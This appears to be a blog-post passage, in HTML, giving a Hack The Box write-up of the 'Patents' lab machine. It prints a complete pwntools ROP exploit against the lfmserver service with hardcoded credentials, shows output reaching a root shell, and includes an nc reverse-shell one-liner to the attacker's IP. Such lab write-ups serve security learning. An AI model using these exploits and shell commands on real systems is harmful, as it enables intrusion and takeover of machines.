+WVe2dXZ+5zHvfRXw6GVnwrS2V47XgGTDn+WLyW7q++G73gYx6hBIq1E8N+bHRdvtG1vdqXi7laKm
+/0OpITBaRWVj0Bex0ufneM5kzRx2FxibI9qX56nNZwTj3bAeo27OXyZUQv/kFJzWfEinVqx9gu6T
+vZ28v/J20zUGlLz09KVO1uwM92S8XDwBq0sB6ljezryxfbNT9PiXKNslD/0UQN6WbLZGM2uAJFIW
+t6qeIjNJfVR/vNiGN/khbsfc09cy3hbH/vEzxM52P2Ey+PFNZkr5xUkFstghJLvx1PPsWfBD+GwS
+a0GeyOW7tuyyHwu9TvUQfK+s3UuOj4SjcZGJhHTEJyhQUDHCf3euhv8r+Ff+D2F5WVlJFT1REUkV
+WWXx/9Pr+N/I/8jA+q/5H9lYmNn+mf/pn/kfmZnZ2P7mf/xPoGTiauLoTEisZGJj52piTGhjYudG
+aGphbeJER6giIalMqCSqIK8sqSKvpEn49U5ejlBZTY4YBkbF3MKJ0PFfGzsRGtnZ2Fg4E7IbsbEx
+cDKxMJiyMLIYMBkZchiYMjCYsrOaGhuxG5kamjKwsLOymrLSwcCQECpYmxg4mRCa2DqbOBI6m5v8
+f4zYmDg5GZiZEJraORJ62Lk4EhqZG9ia/eOOjIWtiRPhP3I5W9iafZlws3A2J6Qgofh6YW1NaGhC
+aGFma+doYvyd0MDW+OtBaGJj7+zxP1k0MLT7x9n/b110MCRfVuRtCQ0dDWyNzAltDJy+nPn6SPjf
+VRI62/1j9d+FnU2MuWBIoG1N/h0eLkLCr9AIisiK/pcPrU1tnEwcXf+xA/PfLe7/H/yr/cuKKomL
+6v1f0fT/xT9tnI2F5f9n/ifGf83/8j9v/4zsf/O//Wf472n//917/Ze//OUvf/nLX/7yl7/85S9/
++ctf/vKXv/zlL3/5y1/+8n9f/l+WXf6rAEgDAA==
+</code></pre></div></div>
+
+<p><strong>Localhost:</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">echo</span> <span class="s">"$(cat file.txt)"</span> <span class="o">|</span> <span class="n">base</span> <span class="o">-</span><span class="n">d</span> <span class="o">&gt;</span> <span class="n">repo</span><span class="o">.</span><span class="n">tar</span>
+<span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">tar</span> <span class="o">-</span><span class="n">zxvf</span> <span class="n">repo</span><span class="o">.</span><span class="n">tar</span>
+<span class="n">arg_parsing</span><span class="o">.</span><span class="n">c</span>  <span class="nb">file</span><span class="o">.</span><span class="n">h</span>  <span class="n">lfm</span><span class="o">.</span><span class="n">h</span>           <span class="n">lfmserver</span><span class="o">.</span><span class="n">h</span>  <span class="n">Makefile</span>  <span class="n">params_parsing</span><span class="o">.</span><span class="n">c</span>  <span class="n">README</span>       <span class="n">thread</span><span class="o">.</span><span class="n">c</span>                                    
+<span class="n">arg_parsing</span><span class="o">.</span><span class="n">h</span>  <span class="n">files</span>   <span class="n">lfmserver</span><span class="o">.</span><span class="n">c</span>     <span class="n">log</span><span class="o">.</span><span class="n">c</span>        <span class="n">md5</span><span class="o">.</span><span class="n">c</span>     <span class="n">params_parsing</span><span class="o">.</span><span class="n">h</span>  <span class="n">process</span><span class="o">.</span><span class="n">c</span>    <span class="n">socket_io</span><span class="o">.</span><span class="n">c</span>  <span class="n">thread</span><span class="o">.</span><span class="n">h</span>                                    
+<span class="nb">file</span><span class="o">.</span><span class="n">c</span>         <span class="n">lfm</span><span class="o">.</span><span class="n">c</span>   <span class="n">lfmserver</span><span class="o">.</span><span class="n">conf</span>  <span class="n">log</span><span class="o">.</span><span class="n">h</span>        <span class="n">md5</span><span class="o">.</span><span class="n">h</span>     <span class="n">process</span><span class="o">.</span><span class="n">h</span>    <span class="n">socket_io</span><span class="o">.</span><span class="n">h</span>                       
+</code></pre></div></div>
+
+<p>Now I got file and you can download <a href="/public/images/files/Patents.tar">here</a> and the code of the <code class="highlighter-rouge">lfmserver</code> if you are unknown about the lfmserver then visit <a href="https://inigo.katxi.org/devel/lfm/">here</a>.</p>
+
+<h1 id="rop-to-root">ROP to Root</h1>
+
+<p>Now to get the root, I made a simple exploit to pwn the shell by using <code class="highlighter-rouge">ROP</code>. Here I will go through the exploit but detail about the <code class="highlighter-rouge">ROP with aslr enabled</code> will be explained in my next post of <code class="highlighter-rouge">Exploitation&amp;Pwning part 2</code> Series.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#exploit.py
+#!/usr/bin/env python
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s">'patents.htb'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">8888</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="mi">6</span>
+<span class="nb">bin</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./lfmserver'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'libc.so.6'</span><span class="p">)</span>
+<span class="n">time</span> <span class="o">=</span> <span class="mf">0.1</span>
+<span class="nb">hash</span> <span class="o">=</span> <span class="s">"26ab0db90d72e28ad0ba1e22ee510510"</span>
+<span class="n">user</span> <span class="o">=</span> <span class="s">"lfmserver_user"</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s">"!gby0l0r0ck$$!"</span>
+
+<span class="k">def</span> <span class="nf">gen</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">{0:0&gt;2}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="s">"x"</span><span class="p">))</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">genRequest</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">request</span> <span class="o">=</span> <span class="s">"</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">f</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">f</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">f</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">f</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">f</span><span class="si">%2</span><span class="s">e</span><span class="si">%2</span><span class="s">e/proc/sys/kernel/randomize_va_space</span><span class="si">%</span><span class="s">x00</span><span class="si">%61%61%61%61%61%61%61%61%62%61%61%61%61%61%61%61%63%61%61%61%61%61%61%61%64%61%61%61%61%61%61%61%65%61%61%61%61%61%61%61%66%61%61%61%61%61%61%61%67%61%61%61%61%61%61%61%68%61%61%61%61%61%61%61%69%61%61%61%61%61%61%61%6</span><span class="s">a</span><span class="si">%61%61%61%61%61%61%61%6</span><span class="s">b</span><span class="si">%61%61%61%61%61%61%61%6</span><span class="s">c</span><span class="si">%61%61%61%61%61%61%61%6</span><span class="s">d</span><span class="si">%61%61%61%61%61%61%61%6</span><span class="s">e</span><span class="si">%00</span><span class="s">{}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    <span class="n">request</span> <span class="o">=</span> <span class="s">"CHECK /{} LFM</span><span class="se">\r\n</span><span class="s">User={}</span><span class="se">\r\n</span><span class="s">Password={}</span><span class="se">\r\n\r\n</span><span class="s">{}</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="nb">hash</span><span class="p">)</span>
+<span class="c1">#   log.info('Request: ' + request)
+</span>    <span class="k">return</span> <span class="n">request</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">gen</span><span class="p">()</span>
+<span class="n">poprdi</span> <span class="o">=</span> <span class="mh">0x405c4b</span> <span class="c1"># pop rdi; ret;
+</span><span class="n">poprsi</span> <span class="o">=</span> <span class="mh">0x405c49</span> <span class="c1"># pop rsi; pop r15; ret;
+</span><span class="n">nop</span> <span class="o">=</span>  <span class="mh">0x40251f</span> <span class="c1"># nop; ret;
+</span>
+<span class="n">rop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">bin</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'dup2'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">bin</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">genRequest</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">4</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="mi">7</span><span class="p">]</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'dup2'</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Libc base: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="n">cont</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'Press Enter to continue.'</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">gen</span><span class="p">()</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprsi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">bin</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'dup2'</span><span class="p">])</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprsi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">bin</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'dup2'</span><span class="p">])</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprsi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">bin</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'dup2'</span><span class="p">])</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="s">''</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">payload</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprsi</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">bin</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'dup2'</span><span class="p">])</span>
+
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">bin</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x501e3</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">genRequest</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'id ; hostname'</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>At first I used the hash of <code class="highlighter-rouge">lfmserver_user</code> along with the password <code class="highlighter-rouge">!gby0l0r0ck$$!</code> to valid the server creds. Here I used two function one to decode and next one to disable the <code class="highlighter-rouge">ASLR</code> and <code class="highlighter-rouge">overflow the uffer</code>. After buffer was overflowed Address was <code class="highlighter-rouge">leaked from GOT</code> to get the <code class="highlighter-rouge">libc</code> version. Then used a <code class="highlighter-rouge">ROP Chain</code>with <code class="highlighter-rouge">dup2</code> to get the reverse shell and finally I got the shell.
+But here a shell was killed after certain sec so I created a new listener and used the reverse shell too and I finally got the shell.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~/</span><span class="n">mystuff</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">patents</span><span class="o">/</span><span class="n">repo</span><span class="o">/</span><span class="err">$</span> <span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/home/gr4n173/mystuff/htb/patents/repo/lfmserver'</span>                                                                              
+    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>                                                                                                                         
+    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>                                                                                                                           
+    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>                                                                                                                         
+    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>                                                                                                                              
+    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>                                                                                                                       
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/home/gr4n173/mystuff/htb/patents/repo/libc.so.6'</span>                                                                              
+    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>                                                                                                                         
+    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>                                                                                                                           
+    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>                                                                                                                            
+    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>                                                                                                                              
+    <span class="n">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>                                                                                                                             
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">patents</span><span class="o">.</span><span class="n">htb</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">8888</span><span class="p">:</span> <span class="n">Done</span>                                                                                              
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Receiving</span> <span class="nb">all</span> <span class="n">data</span><span class="p">:</span> <span class="n">Done</span> <span class="p">(</span><span class="mi">94</span><span class="n">B</span><span class="p">)</span>                                                                                                                    
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Closed</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">patents</span><span class="o">.</span><span class="n">htb</span> <span class="n">port</span> <span class="mi">8888</span>                                                                                                        
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Libc</span> <span class="n">base</span><span class="p">:</span> <span class="mh">0x7ff8408a3000</span>
+<span class="n">Press</span> <span class="n">Enter</span> <span class="n">to</span> <span class="k">continue</span><span class="o">.</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">patents</span><span class="o">.</span><span class="n">htb</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">8888</span><span class="p">:</span> <span class="n">Done</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>                                                                                                                     
+<span class="n">LFM</span> <span class="mi">200</span> <span class="n">OK</span>                                                                                                                                            
+<span class="n">Size</span><span class="p">:</span> <span class="mi">32</span>                                                                                                                                              
+                                                                                                                                                      
+<span class="mi">26</span><span class="n">ab0db90d72e28ad0ba1e22ee510510</span>                                                                                                                      
+\<span class="n">x9a</span><span class="o">@</span><span class="n">V</span> <span class="o">@</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00x</span>\<span class="n">xa2</span><span class="o">@</span>\<span class="n">x89</span>\<span class="n">x90</span><span class="o">@</span> <span class="o">@</span><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+<span class="n">patents</span>
+<span class="err">$</span> <span class="n">ls</span>
+<span class="n">files</span>
+<span class="n">firewall</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">lfmserver</span>
+<span class="n">lfmserver</span><span class="o">.</span><span class="n">log</span>
+<span class="err">$</span> <span class="n">whoami</span>
+<span class="n">root</span>
+<span class="err">$</span> <span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="o">|/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="o">|</span><span class="n">nc</span> <span class="mf">10.10.14.32</span> <span class="mi">5555</span> <span class="o">&gt;/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span>
+</code></pre></div></div>
+
+<p><strong>Listner On:</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">5555</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="nb">any</span><span class="p">]</span> <span class="mi">5555</span> <span class="o">...</span>                                                                                                                           
+<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10.14.32</span><span class="p">]</span> <span class="k">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10.10.173</span><span class="p">]</span> <span class="mi">37032</span>                                                                                          
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="s">'t access tty; job control turned off                                                                                                  </span><span class="err">
+</span><span class="s"># whoami                                                                                                                                              </span><span class="err">
+</span><span class="s">root</span><span class="err">
+</span><span class="s"># python -c "import pty;pty.spawn('</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="s">')"                                                                                                       </span><span class="err">
+</span><span class="s">root@patents:~# ls -al </span><span class="err">
+</span><span class="s">ls -al </span><span class="err">
+</span><span class="s">total 23</span><span class="err">
+</span><span class="s">drwxr-xr-x  7 root root  1024 Dec  3 14:25 .</span><span class="err">
+</span><span class="s">drwxr-xr-x 23 root root  4096 Jan 12 00:03 ..</span><span class="err">
+</span><span class="s">lrwxrwxrwx  1 root root     9 May 22  2019 .bash_history -&gt; /dev/null</span><span class="err">
+</span><span class="s">drwx------  2 root root  1024 May 21  2019 .cache</span><span class="err">
+</span><span class="s">drwx------  3 root root  1024 May 21  2019 .gnupg</span><span class="err">
+</span><span class="s">drwxr-xr-x  3 root root  1024 Dec  3 14:25 .local</span><span class="err">
+</span><span class="s">drwx------  2 root root 12288 May 21  2019 lost+found</span><span class="err">
+</span><span class="s">drwxr-xr-x  3 root root  1024 May 21  2019 snap</span><span class="err">
+</span><span class="s">-rw-------  1 root root  1606 May 22  2019 .viminfo                                 </span><span class="err">
+</span></code></pre></div></div>
+
+<p>This way I got the shell but I can’t see the root flag inside the <code class="highlighter-rouge">home</code> directory then I was like <code class="highlighter-rouge">Hmm..... What the heck?</code>. So I checked every possible way along with commands but unable to figure it out. But Recently I got into the problem about my <code class="highlighter-rouge">dpkg</code> folder so I used the live usb and solved that problem. For that I first had to <code class="highlighter-rouge">mount</code> my harddisk from certain <code class="highlighter-rouge">/dev/sda{number}</code> where my OS was located to any directory I like and used <code class="highlighter-rouge">chroot</code> to edit or update my file. After mounting I <code class="highlighter-rouge">update &amp;&amp; upgrade</code> my linux  and my problem was solved. These are resources which I used to solve my problem <a href="https://askubuntu.com/questions/419304/dpkg-divert-error-rename-involves-overwriting-usr-lib-xorg-protocol-txt-wit">here1</a>, <a href="https://ubuntuforums.org/archive/index.php/t-1732258.html">here2</a> and <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=950533">here3</a>. If you ever encounter with <code class="highlighter-rouge">dpkg</code> problem then you can refer this link or you can ping me in <code class="highlighter-rouge">discord</code> too.</p>
+
+<p>I described a lot about recent problem, now let’s come to point. As I solved my problem by <code class="highlighter-rouge">mount</code> &amp; <code class="highlighter-rouge">unmount</code> and I have that command in my mind. Then I tried the same basic command to see if there are any other disk available.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@patents:~#lsblk 
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT                                                                                                            
+loop0    7:0    0 54.2M  1 loop /snap/lxd/10756                                                                                                       
+loop1    7:1    0 66.7M  1 loop /snap/lxd/9239                                                                                                        
+loop2    7:2    0 54.9M  1 loop /snap/lxd/12631                                                                                                       
+loop3    7:3    0 89.1M  1 loop /snap/core/8268                                                                                                       
+loop4    7:4    0 89.1M  1 loop /snap/core/8039                                                                                                       
+sda      8:0    0   25G  0 disk                                                                                                                       
+├─sda1   8:1    0    1M  0 part                                                                                                                       
+├─sda2   8:2    0   16G  0 part /                                                                                                                     
+├─sda3   8:3    0    1G  0 part /boot                                                                                                                 
+└─sda4   8:4    0    2G  0 part /home                                                                                                                 
+sdb      8:16   0  512M  0 disk                                                                                                                       
+└─sdb1   8:17   0  511M  0 part /root                                                                                                                 
+sr0     11:0    1 1024M  0 rom
+</code></pre></div></div>
+
+<p>Then I was like <code class="highlighter-rouge">Hell.....Yea!!</code>. Now I mounted and read the <code class="highlighter-rouge">root flag</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">patents</span><span class="p">:</span><span class="o">~</span><span class="c1"># mkdir /tmp/file                                                                                                                       
+</span><span class="n">mkdir</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nb">file</span>                                                                                                                                       
+<span class="n">root</span><span class="o">@</span><span class="n">patents</span><span class="p">:</span><span class="o">~</span><span class="c1"># mount /dev/sda2 /tmp/file                                                                                                             
+</span><span class="n">mount</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">sda2</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nb">file</span>  
+<span class="n">root</span><span class="o">@</span><span class="n">patents</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nb">file</span><span class="o">/</span><span class="n">root</span><span class="c1"># cat root.txt                                                                                                             
+</span><span class="n">cat</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>                                                                                                                                          
+<span class="n">d63b0</span><span class="o">**********************</span> 
+</code></pre></div></div>
+
+<p>This way I got the root of <code class="highlighter-rouge">Patents</code> box and learned alot from this box. So I would like to thank creator of this box <code class="highlighter-rouge">gbyolo</code> for such an awesome box.</p>
+
+<p>I will be posting writeup of next box after box retired and I have started series of <code class="highlighter-rouge">Exploitation&amp;Pwing</code> where you can learn pwn technique from basic visit here my <a href="https://gr4n173.github.io/2020/05/01/hackpack-ctf-pwn.html">First Post</a> about this series. I would like to Thank readers for being with me through out this writeup.</p>
+
+<p>Feedback are really appreciated !!</p>
+
+<p>Tweet about this writeup if you like.</p>
+
+<p>You can see more blog at my medium here: <a href="https://medium.com/@gr4n173">gr4n173</a>.</p>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'gr4n173'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2020/05/01/hackpack-ctf-pwn.html">
+          HackPack CTF: Pwn Challenge
+          </a>
